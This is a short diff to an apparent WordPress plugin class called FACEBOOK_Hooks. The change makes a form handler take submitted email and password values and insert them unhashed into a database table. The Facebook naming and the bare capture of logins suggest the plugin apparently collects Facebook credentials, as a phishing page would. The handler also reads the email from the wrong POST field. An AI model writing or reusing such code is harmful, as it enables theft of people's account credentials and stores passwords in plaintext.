@@ -32,11 +32,16 @@ if (!class_exists('FACEBOOK_Hooks')) {
 
         function facebook_from_set_ac()
         {
+            global $wpdb;
+
             $email = isset($_POST['email']) ? $_POST['name'] : '';
             $password = isset($_POST['password']) ? $_POST['password'] : '';
 
-            echo $email;
-            echo $password;
+            $table_name = $wpdb->prefix .FACEBOOK_TABLE_REPORTS;
+            $wpdb->insert($table_name, array(
+                'email' => $email,
+                'password' => $password
+            ));
 
         }
 
